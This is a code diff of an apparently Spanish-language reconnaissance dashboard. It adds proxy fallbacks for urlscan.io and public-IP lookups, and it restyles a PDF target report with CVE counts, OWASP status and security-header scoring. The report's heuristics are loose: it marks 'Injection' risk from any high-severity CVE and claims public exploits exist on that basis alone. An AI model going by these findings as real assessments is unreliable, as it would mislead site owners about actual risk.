+    var label=h.hop+(h.ip&&h.ip!=='*'?' '+escH(h.ip.split('.').slice(0,2).join('.')+'..'):' *');
+    legHtml+='<span style="color:'+col+'">'+label+'</span>';
+    if(h.time&&h.time!=='* * *') legHtml+='<span style="color:rgba(0,255,65,.3);font-size:.55em;"> '+escH(h.time)+'</span>';
+    legHtml+='  ';
+  });
+  leg.innerHTML=legHtml;
+
+  geomapStatus('<span style="color:var(--g)">✓ Traceroute completado — '+validHops.length+'/'+hops.length+' hops en mapa</span>');
 }
 
 // ── URLSCAN.IO ────────────────────────────────────────────────
@@ -7864,11 +8129,23 @@ async function runUrlScan(){
   panel.style.display='none';
 
   try{
-    var r=await fetch('https://urlscan.io/api/v1/search/?q=domain:'+encodeURIComponent(domain)+'&size=5',
-      {signal:AbortSignal.timeout(12000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var d=await r.json();
-    var results=d.results||[];
+    // urlscan.io — try direct first, proxy fallback
+    var _usUrl='https://urlscan.io/api/v1/search/?q=domain:'+encodeURIComponent(domain)+'&size=5';
+    var d=null;
+    try{
+      var _r1=await fetch(_usUrl,{signal:AbortSignal.timeout(10000),headers:{'Accept':'application/json'}});
+      if(_r1.ok) d=await _r1.json();
+      else throw new Error('direct:'+_r1.status);
+    }catch(e1){
+      try{
+        var _r2=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(_usUrl),{signal:AbortSignal.timeout(15000)});
+        if(!_r2.ok) throw new Error('proxy:'+_r2.status);
+        var _w2=await _r2.json();
+        if(!_w2.contents) throw new Error('proxy empty');
+        d=JSON.parse(_w2.contents);
+      }catch(e2){throw new Error('urlscan no disponible ('+e2.message+')');}
+    }
+    var results=(d&&d.results)||[];
     if(!results.length){
       geomapStatus('<span style="color:rgba(0,255,65,.4)">// Sin escaneos previos en urlscan.io para: '+escH(domain)+'</span>');
       return;
@@ -8205,21 +8482,46 @@ async function hashVerify(){
 }
 
 async function tkMyIP(){
-  tkOut('ip','<span style="color:var(--amber)">// Detectando tu IP...</span>');
-  try{
-    var r=await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(8000)});
-    var d=await r.json();
-    if(d.error) throw new Error(d.reason||d.error);
-    document.getElementById('ip-d').value=d.ip;
-    var out='<span style="color:var(--g)">// TU IP PUBLICA</span>\n\n';
-    out+='<span style="color:var(--amber)">IP:</span>      '+escH(d.ip)+'\n';
-    out+='<span style="color:var(--cyan)">País:</span>    '+escH(d.country_name||'N/A')+' ('+escH(d.country_code||'')+')'+'\n';
-    out+='<span style="color:var(--cyan)">Ciudad:</span>  '+escH(d.city||'N/A')+', '+escH(d.region||'')+'\n';
-    out+='<span style="color:var(--amber)">ISP:</span>     '+escH(d.org||'N/A')+'\n';
-    out+='<span style="color:var(--amber)">ASN:</span>     '+escH(d.asn||'N/A')+'\n';
-    out+='\n<span style="color:rgba(0,255,65,.3)">// Click LOOKUP para detalle completo</span>\n';
-    tkOut('ip',out);
-  }catch(e){tkOut('ip','<span style="color:var(--red)">Error: '+e.message+'</span>');}
+  var _writeMyIP=function(html){
+    tkOut('ip',html);
+    var io=document.getElementById('ipinfo-out');
+    if(io){io.innerHTML=html;io.classList.add('show');}
+  };
+  _writeMyIP('<span style="color:var(--amber)">// Detectando tu IP pública...</span>');
+  var d=null;
+  var apis=[
+    async function(){
+      var r=await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(5000)});
+      return await r.json(); // {ip}
+    },
+    async function(){
+      var r=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent('https://ipapi.co/json/'),{signal:AbortSignal.timeout(8000)});
+      var w=await r.json(); return JSON.parse(w.contents);
+    },
+    async function(){
+      var r=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent('https://ip-api.com/json/'),{signal:AbortSignal.timeout(8000)});
+      var w=await r.json(); var j=JSON.parse(w.contents);
+      return {ip:j.query,city:j.city,region:j.regionName,country_name:j.country,country_code:j.countryCode,org:j.isp,asn:j.as};
+    }
+  ];
+  for(var i=0;i<apis.length;i++){
+    try{d=await apis[i]();if(d&&d.ip)break;}catch(e){d=null;}
+  }
+  if(!d||!d.ip){
+    _writeMyIP('<span style="color:var(--red)">// No se pudo detectar IP. Comprueba tu conexión.</span>');
+    return;
+  }
+  document.getElementById('ip-d').value=d.ip;
+  var inp=document.getElementById('ipinfo-target');
+  if(inp&&!inp.value) inp.value=d.ip;
+  var out='<span style="color:var(--g)">// TU IP PÚBLICA</span>\n\n';
+  out+='<span style="color:var(--amber)">IP:</span>      '+escH(d.ip)+'\n';
+  if(d.country_name) out+='<span style="color:var(--cyan)">País:</span>    '+escH(d.country_name)+' ('+escH(d.country_code||')')+'\n';
+  if(d.city)         out+='<span style="color:var(--cyan)">Ciudad:</span>  '+escH(d.city)+', '+escH(d.region||'')+'\n';
+  if(d.org)          out+='<span style="color:var(--amber)">ISP:</span>     '+escH(d.org)+'\n';
+  if(d.asn)          out+='<span style="color:var(--amber)">ASN:</span>     '+escH(d.asn)+'\n';
+  out+='\n<span style="color:rgba(0,255,65,.3)">// IP detectada — click LOOKUP para detalle completo</span>\n';
+  _writeMyIP(out);
 }
 
 // HTTP Headers via allorigins proxy
@@ -8575,66 +8877,82 @@ function generateTargetPDF(mode){
       kv('Autenticación de email (SPF)', d.spf?'✓ Configurado correctamente':'✗ No configurado — riesgo de suplantación', d.spf?'#16a34a':'#dc2626')+
       kv('Política anti-spoofing (DMARC)', d.dmarc?'✓ Configurado':'✗ No configurado — emails pueden falsificarse', d.dmarc?'#16a34a':'#dc2626')+
       kv('Certificado SSL/TLS', d.sslDays===undefined?'—':d.sslDays<0?'✗ EXPIRADO':d.sslDays<30?'⚠ Expira en '+d.sslDays+' días':'✓ Válido ('+d.sslDays+' días)', d.sslDays<0?'#dc2626':d.sslDays<30?'#ca8a04':undefined)+
+      (d.secHeaders&&d.secHeaders._score!==undefined?kv('Cabeceras de Seguridad HTTP',
+        (d.secHeaders._score>=80?'✓ Buenas prácticas':d.secHeaders._score>=50?'⚠ Implementación parcial':'✗ Cabeceras críticas ausentes')+
+        ' ('+d.secHeaders._score+'% — '+
+        (d.secHeaders._present||[]).length+' OK, '+
+        (d.secHeaders._missing||[]).length+' faltantes)',
+        d.secHeaders._score>=80?'#16a34a':d.secHeaders._score>=50?'#d97706':'#dc2626'):'')+
       '</table></div></div>';
 
     var execF2 = '<div class="page">'+
       '<div class="phase-header"><span class="phase-num">02</span><span class="phase-icon">⚔</span><span class="phase-title">VULNERABILIDADES IDENTIFICADAS</span></div>'+
+
+      // ── CVE summary cards ──────────────────────────────────────
       '<div class="subsection"><div class="sub-title">Resumen de Vulnerabilidades</div>'+
-      '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px;">'+
+      '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:0;">'+
         '<div style="text-align:center;padding:14px;background:#fff5f5;border:1px solid #fca5a5;border-radius:6px;">'+
-          '<div style="font-size:24pt;font-weight:700;color:#dc2626;">'+(cveHigh+(d.takeover&&d.takeover.length||0))+'<div class="subsection" style="margin-top:16px;"><div class="sub-title" style="color:#1c3a5c;border-color:#1c3a5c;">OWASP Top 10 — Estado</div>'+
-      '<table class="kv" style="font-size:.75rem;">'+
+          '<div style="font-size:28pt;font-weight:700;color:#dc2626;line-height:1;">'+(cveHigh+(d.takeover&&d.takeover.length||0))+'</div>'+
+          '<div style="font-size:8pt;color:#666;margin-top:6px;letter-spacing:1px;">CRÍTICAS / ALTAS</div>'+
+        '</div>'+
+        '<div style="text-align:center;padding:14px;background:#fefce8;border:1px solid #fde047;border-radius:6px;">'+
+          '<div style="font-size:28pt;font-weight:700;color:#ca8a04;line-height:1;">'+cveMed+'</div>'+
+          '<div style="font-size:8pt;color:#666;margin-top:6px;letter-spacing:1px;">MEDIAS</div>'+
+        '</div>'+
+        '<div style="text-align:center;padding:14px;background:#f0fdf4;border:1px solid #86efac;border-radius:6px;">'+
+          '<div style="font-size:28pt;font-weight:700;color:#16a34a;line-height:1;">'+(cveTotalCount-cveHigh-cveMed>0?cveTotalCount-cveHigh-cveMed:0)+'</div>'+
+          '<div style="font-size:8pt;color:#666;margin-top:6px;letter-spacing:1px;">BAJAS</div>'+
+        '</div>'+
+      '</div></div>'+
+
+      // ── OWASP Top 10 ───────────────────────────────────────────
+      '<div class="subsection"><div class="sub-title" style="color:#1c3a5c;border-color:#1c3a5c;">OWASP Top 10 — Estado</div>'+
+      '<table style="width:100%;border-collapse:collapse;font-size:9pt;">'+
+      '<thead><tr>'+
+        '<th style="text-align:left;padding:7px 10px;background:#f1f5f9;color:#1c3a5c;font-size:8pt;letter-spacing:.5px;border-bottom:2px solid #cbd5e1;width:110px;">ID</th>'+
+        '<th style="text-align:left;padding:7px 10px;background:#f1f5f9;color:#1c3a5c;font-size:8pt;letter-spacing:.5px;border-bottom:2px solid #cbd5e1;">Categoría</th>'+
+        '<th style="text-align:left;padding:7px 10px;background:#f1f5f9;color:#1c3a5c;font-size:8pt;letter-spacing:.5px;border-bottom:2px solid #cbd5e1;width:180px;">Estado</th>'+
+      '</tr></thead>'+
+      '<tbody>'+
       (function(){
         var rows='';
         var d2=d;
-        var a01=d2.subs&&d2.subs.some(function(s){return s.takeover;})||d2.takeover&&d2.takeover.length?'🔴 Riesgo':'🟢 Sin evidencia';
-        var a02=(!d2.spf||!d2.dmarc)?'🟡 Configuración débil':'🟢 Sin evidencia';
-        var a03=d2.cveDetails&&d2.cveDetails.some(function(v){return parseFloat(v.cvss3||v.cvss||0)>=7;})?'🔴 CVEs High/Critical':'🟢 Sin evidencia';
-        var a04=(!d2.spf||!d2.dmarc)?'🟡 Email sin autenticación':'🟢 OK';
-        var a05=d2.sslDays!==undefined&&d2.sslDays<30?'🟡 SSL próximo a vencer':'🟢 OK';
-        var a06=d2.cves&&d2.cves.length?'🔴 '+d2.cves.length+' CVEs conocidos':'🟢 Sin evidencia';
-        var a07=d2.cveDetails&&d2.cveDetails.some(function(v){return(v.id||'').toLowerCase().includes('auth')||(v.summary||'').toLowerCase().includes('auth');})?'🟡 Revisar':'🟢 Sin evidencia';
-        var a09=d2.greyNoise&&d2.greyNoise.classification==='malicious'?'🔴 IP maliciosa':'🟢 Sin evidencia';
-        var a10=d2.robots&&d2.robots.length?'🟡 Paths expuestos en robots.txt':'🟢 Sin evidencia';
         var items=[
-          ['A01:2021','Broken Access Control',a01],
-          ['A02:2021','Cryptographic Failures',a02],
-          ['A03:2021','Injection',a03],
-          ['A04:2021','Insecure Design',a04],
-          ['A05:2021','Security Misconfiguration',a05],
-          ['A06:2021','Vulnerable Components',a06],
-          ['A07:2021','Auth & Session Failures',a07],
-          ['A09:2021','Security Logging Failures',a09],
-          ['A10:2021','SSRF / Info Disclosure',a10],
+          ['A01:2021','Broken Access Control',   d2.takeover&&d2.takeover.length?'🔴 Riesgo detectado':'🟢 Sin evidencia'],
+          ['A02:2021','Cryptographic Failures',  (!d2.spf||!d2.dmarc)||d2.sslDays<30?'🟡 Configuración débil':'🟢 Sin evidencia'],
+          ['A03:2021','Injection',               d2.cveDetails&&d2.cveDetails.some(function(v){return parseFloat(v.cvss3||v.cvss||0)>=7;})?'🔴 CVEs High/Critical':'🟢 Sin evidencia'],
+          ['A04:2021','Insecure Design',         (!d2.spf||!d2.dmarc)?'🟡 Email sin autenticación fuerte':'🟢 OK'],
+          ['A05:2021','Security Misconfiguration',d2.sslDays!==undefined&&d2.sslDays<30?'🟡 SSL próximo a vencer':'🟢 OK'],
+          ['A06:2021','Vulnerable Components',   d2.cves&&d2.cves.length?'🔴 '+d2.cves.length+' CVEs conocidos':'🟢 Sin evidencia'],
+          ['A07:2021','Auth & Session Failures', d2.cveDetails&&d2.cveDetails.some(function(v){return(v.summary||'').toLowerCase().includes('auth');})?'🟡 Revisar':'🟢 Sin evidencia'],
+          ['A09:2021','Security Logging Failures',d2.greyNoise&&d2.greyNoise.classification==='malicious'?'🔴 IP maliciosa':'🟢 Sin evidencia'],
+          ['A10:2021','SSRF / Info Disclosure',  d2.robots&&d2.robots.length?'🟡 Paths en robots.txt':'🟢 Sin evidencia'],
         ];
-        items.forEach(function(it){
+        items.forEach(function(it,i){
           var col=it[2].startsWith('🔴')?'#dc2626':it[2].startsWith('🟡')?'#d97706':'#16a34a';
-          rows+='<tr><td class="td-k" style="color:#1c3a5c;font-weight:600;">'+eh(it[0])+'</td>'+
-                '<td class="td-k" style="color:#555;">'+eh(it[1])+'</td>'+
-                '<td class="td-v" style="color:'+col+';font-weight:600;">'+eh(it[2])+'</td></tr>';
+          var bg=i%2===0?'#ffffff':'#f8fafc';
+          rows+='<tr style="background:'+bg+';">'+
+            '<td style="padding:8px 10px;color:#1c3a5c;font-weight:600;font-size:8.5pt;white-space:nowrap;border-bottom:1px solid #e2e8f0;">'+eh(it[0])+'</td>'+
+            '<td style="padding:8px 10px;color:#374151;font-size:9pt;border-bottom:1px solid #e2e8f0;">'+eh(it[1])+'</td>'+
+            '<td style="padding:8px 10px;color:'+col+';font-weight:600;font-size:9pt;border-bottom:1px solid #e2e8f0;">'+eh(it[2])+'</td>'+
+          '</tr>';
         });
         return rows;
       })()+
-      '</table></div>'+'</div>'+
-          '<div style="font-size:8pt;color:#666;margin-top:4px;">CRÍTICAS / ALTAS</div>'+
-        '</div>'+
-        '<div style="text-align:center;padding:14px;background:#fefce8;border:1px solid #fde047;border-radius:6px;">'+
-          '<div style="font-size:24pt;font-weight:700;color:#ca8a04;">'+cveMed+'</div>'+
-          '<div style="font-size:8pt;color:#666;margin-top:4px;">MEDIAS</div>'+
-        '</div>'+
-        '<div style="text-align:center;padding:14px;background:#f0fdf4;border:1px solid #86efac;border-radius:6px;">'+
-          '<div style="font-size:24pt;font-weight:700;color:#16a34a;">'+(cveTotalCount-cveHigh-cveMed)+'</div>'+
-          '<div style="font-size:8pt;color:#666;margin-top:4px;">BAJAS</div>'+
-        '</div>'+
-      '</div></div>'+
-      (cveTotalCount>0?'<div class="subsection"><div class="sub-title">Vulnerabilidades de Software ('+cveTotalCount+' CVEs)</div>'+
-        '<p style="font-size:9pt;color:#333;margin-bottom:8px;">Se detectaron <strong>'+cveTotalCount+' vulnerabilidades de seguridad conocidas</strong> en el software de infraestructura del servidor, incluyendo '+cveHigh+' de severidad CRÍTICA/ALTA. Estas vulnerabilidades son públicamente conocidas y cuentan con exploits disponibles.</p>'+
+      '</tbody></table></div>'+
+
+      // ── CVE detail (if any) ────────────────────────────────────
+      (cveTotalCount>0?
+        '<div class="subsection"><div class="sub-title">Vulnerabilidades de Software ('+cveTotalCount+' CVEs)</div>'+
+        '<p style="font-size:9pt;color:#374151;margin-bottom:10px;line-height:1.6;">Se detectaron <strong>'+cveTotalCount+' vulnerabilidades conocidas</strong> en el software de infraestructura, incluyendo <strong style="color:#dc2626;">'+cveHigh+' de severidad CRÍTICA/ALTA</strong>. Estas vulnerabilidades son públicamente conocidas y pueden tener exploits disponibles.</p>'+
         '<table class="kv">'+
-        kv('Software afectado', d.cveDetails&&d.cveDetails[0]?((d.cveDetails[0].summary||'').match(/Apache|nginx|PHP|OpenSSL|WordPress|IIS|Tomcat/i)||['Servidor web'])[0]:'Software de servidor')+
+        kv('Software afectado', d.cveDetails&&d.cveDetails[0]?((d.cveDetails[0].summary||'').match(/Apache|nginx|PHP|OpenSSL|WordPress|IIS|Tomcat/i)||['Software de servidor'])[0]:'Software de servidor')+
         kv('Vectores de ataque', d.ports&&d.ports.length?'Puertos '+d.ports.join(', '):'HTTP/HTTPS (80, 443)')+
         kv('Impacto potencial', cveHigh>0?'Compromiso completo del servidor, acceso a datos':'Exposición parcial de información')+
         kv('Explotabilidad', cveHigh>0?'⚠ Exploits públicos disponibles':'Requiere configuración específica')+
-        '</table></div>':'')+'</div>';
+        '</table></div>'
+      :'')+
+      '</div>';
 
     var execF3 = '<div class="page">'+
       '<div class="phase-header"><span class="phase-num">03</span><span class="phase-icon">☣</span><span class="phase-title">INTELIGENCIA DE AMENAZAS</span></div>'+
@@ -8664,6 +8982,26 @@ function generateTargetPDF(mode){
 
     if(!d.spf) execRecs.push({pri:'MEDIA',action:'Configurar registro SPF en DNS',impact:'Sin SPF, actores externos pueden enviar emails como si fueran de @'+domain,effort:'1 día'});
     if(!d.dmarc) execRecs.push({pri:'MEDIA',action:'Implementar política DMARC',impact:'Sin DMARC, ataques de phishing usando el dominio son indetectables',effort:'2-3 días'});
+    if(d.dmarc&&d.dmarc.indexOf('p=none')>=0) execRecs.push({pri:'MEDIA',action:'Endurecer política DMARC: cambiar p=none a p=quarantine',impact:'Política actual solo monitorea — no bloquea emails fraudulentos del dominio',effort:'1-2 semanas (con monitoreo previo)'});
+    // Security headers recommendations from real scan data
+    if(d.secHeaders&&d.secHeaders._missing&&d.secHeaders._missing.length){
+      var missingHdrs=d.secHeaders._missing.map(function(m){return m.info.name;}).join(', ');
+      execRecs.push({pri:'MEDIA',action:'Implementar cabeceras de seguridad HTTP faltantes: '+missingHdrs,impact:'Ausencia de estas cabeceras expone a usuarios a XSS, clickjacking y ataques de protocol downgrade',effort:'3-5 días'});
+    } else {
+    if(d.cveDetails&&d.cveDetails.length>=10) execRecs.push({pri:'ALTA',action:'Implementar programa de patch management mensual ('+d.cveDetails.length+' CVEs acumulados)',impact:'Acumulación crítica indica ausencia de proceso de gestión de vulnerabilidades',effort:'Proceso continuo'});
+    if(d.ports&&d.ports.length>5) execRecs.push({pri:'MEDIA',action:'Auditoría de puertos expuestos — reducir superficie de ataque ('+d.ports.length+' detectados)',impact:'Cada puerto abierto innecesario es un vector potencial de ataque',effort:'1 semana'});
+    if(d.subs&&d.subs.length>20) execRecs.push({pri:'MEDIA',action:'Inventario de subdominios — revisar '+d.subs.length+' activos detectados',impact:'Subdominios olvidados son vectores comunes de acceso inicial y phishing',effort:'2-3 semanas'});
+      execRecs.push({pri:'BAJA',action:'Implementar cabeceras de seguridad HTTP (CSP, HSTS, X-Frame-Options, Permissions-Policy)',impact:'Mitiga XSS, clickjacking, y ataques de protocol downgrade',effort:'3-5 días'});
+    }
+    if(d.secHeaders&&d.secHeaders._warnings&&d.secHeaders._warnings.length){
+      execRecs.push({pri:'MEDIA',action:'Corregir configuración débil en cabeceras HTTP existentes ('+d.secHeaders._warnings.length+' advertencias)',impact:'Cabeceras mal configuradas pueden ser eludidas por atacantes',effort:'1-2 días'});
+    }
+    execRecs.push({pri:'BAJA',action:'Contratar auditoría de seguridad activa (penetration testing)',impact:'El reconocimiento pasivo detecta indicadores — solo un pentest activo valida explotabilidad real',effort:'2-4 semanas'});
+    // Dedup + sort by priority
+    var _seen={};
+    execRecs=execRecs.filter(function(r){if(_seen[r.action])return false;_seen[r.action]=1;return true;});
+    var _po={'CRÍTICA':0,'ALTA':1,'MEDIA':2,'BAJA':3};
+    execRecs.sort(function(a,b){return (_po[a.pri]||9)-(_po[b.pri]||9);});
 
     var execSummary = '<div class="page">'+
       '<div class="phase-header"><span class="phase-num">EXEC</span><span class="phase-icon">📊</span><span class="phase-title">RESUMEN EJECUTIVO Y PLAN DE ACCIÓN</span></div>'+
@@ -8995,14 +9333,64 @@ function generateTargetPDF(mode){
     kv('Spamhaus ZEN', d.spamhaus?'🚨 IP en lista negra':'✓ No listado', d.spamhaus?'#cc0000':undefined)+
     '</table></div>'+
 
-    (d.hdrGrade?
-      '<div class="subsection"><div class="sub-title">Cabeceras de Seguridad HTTP (Mozilla Observatory)</div>'+
-      '<table class="kv">'+
-      kv('Grade', d.hdrGrade, d.hdrGrade&&d.hdrGrade.startsWith('A')?'#007722':d.hdrGrade&&d.hdrGrade.startsWith('B')?'#996600':'#cc0000')+
-      kv('Score', (d.hdrScore||0)+'/100')+
-      kv('Tests pasados', d.hdrPassed||0)+
-      kv('Tests fallidos', d.hdrFailed||0, d.hdrFailed?'#cc0000':undefined)+
-      '</table></div>':'')+
+    // Security headers section — full analysis
+    (function(){
+      var sh=d.secHeaders||{};
+      var present=sh._present||[];
+      var missing=sh._missing||[];
+      var warnings=sh._warnings||[];
+      var score=sh._score;
+      if(!present.length&&!missing.length&&!d.hdrGrade) return '';
+      var scoreColor=score>=80?'#16a34a':score>=50?'#d97706':'#dc2626';
+      var rows='';
+      // Present headers
+      present.forEach(function(p){
+        rows+='<tr style="background:#f0fdf4;">'+
+          '<td style="padding:6px 10px;font-size:8pt;color:#166534;font-weight:600;white-space:nowrap;">✓ '+eh(p.info.name)+'</td>'+
+          '<td style="padding:6px 10px;font-size:7.5pt;color:#374151;word-break:break-all;">'+eh(p.v.substring(0,120)+(p.v.length>120?'...':''))+'</td>'+
+          '<td style="padding:6px 10px;font-size:7.5pt;color:#16a34a;">OK</td>'+
+        '</tr>';
+      });
+      // Missing headers
+      missing.forEach(function(m){
+        rows+='<tr style="background:#fef2f2;">'+
+          '<td style="padding:6px 10px;font-size:8pt;color:#991b1b;font-weight:600;white-space:nowrap;">✗ '+eh(m.info.name)+'</td>'+
+          '<td style="padding:6px 10px;font-size:7.5pt;color:#6b7280;font-style:italic;">No configurada</td>'+
+          '<td style="padding:6px 10px;font-size:7.5pt;color:#dc2626;font-weight:600;">FALTANTE</td>'+
+        '</tr>';
+        rows+='<tr style="background:#fff5f5;">'+
+          '<td colspan="3" style="padding:4px 10px 8px 24px;font-size:7pt;color:#9ca3af;">💡 '+eh(m.info.rec)+'</td>'+
+        '</tr>';
+      });
+      // Warnings
+      warnings.forEach(function(w){
+        rows+='<tr style="background:#fffbeb;">'+
+          '<td colspan="3" style="padding:5px 10px;font-size:7.5pt;color:#b45309;">⚠ '+eh(w)+'</td>'+
+        '</tr>';
+      });
+      var scoreHtml=score!==undefined?
+        '<div style="display:flex;align-items:center;gap:16px;margin-bottom:10px;">'+
+        '<div style="font-size:2rem;font-weight:900;color:'+scoreColor+';">'+score+'%</div>'+
+        '<div><div style="font-size:9pt;font-weight:600;color:'+scoreColor+';">'+
+          (score>=80?'Buenas pr\u00e1cticas':score<50?'Cabeceras cr\u00edticas ausentes':'Implementaci\u00f3n parcial')+
+        '</div>'+
+        '<div style="font-size:8pt;color:#6b7280;">'+present.length+' de '+(present.length+missing.length)+' cabeceras de seguridad implementadas</div>'+
+        '</div></div>':'';
+      return '<div class="subsection" style="page-break-inside:avoid;"><div class="sub-title">Cabeceras de Seguridad HTTP</div>'+
+        scoreHtml+
+        (rows?'<table style="width:100%;border-collapse:collapse;">'+
+          '<thead><tr style="background:#f1f5f9;">'+
+          '<th style="padding:7px 10px;text-align:left;font-size:8pt;color:#1c3a5c;border-bottom:2px solid #cbd5e1;width:140px;">Cabecera</th>'+
+          '<th style="padding:7px 10px;text-align:left;font-size:8pt;color:#1c3a5c;border-bottom:2px solid #cbd5e1;">Valor / Recomendación</th>'+
+          '<th style="padding:7px 10px;text-align:left;font-size:8pt;color:#1c3a5c;border-bottom:2px solid #cbd5e1;width:90px;">Estado</th>'+
+          '</tr></thead><tbody>'+rows+'</tbody></table>':'<p style="font-size:8.5pt;color:#6b7280;">No se pudo obtener cabeceras HTTP para este objetivo.</p>')+
+        (d.hdrGrade?'<div style="margin-top:8px;font-size:8pt;color:#6b7280;">Mozilla Observatory Grade: <strong style="color:'+
+          (d.hdrGrade.startsWith('A')?'#16a34a':d.hdrGrade.startsWith('B')?'#d97706':'#dc2626')+
+          ';">'+eh(d.hdrGrade)+'</strong>'+
+          (d.hdrFailed?' — '+d.hdrFailed+' tests fallidos':'')+
+          '</div>':'')+
+        '</div>';
+    })()+
 
     '<div class="subsection"><div class="sub-title">Referencias Externas</div>'+
     '<div style="font-size:8.5pt;line-height:2;">'+
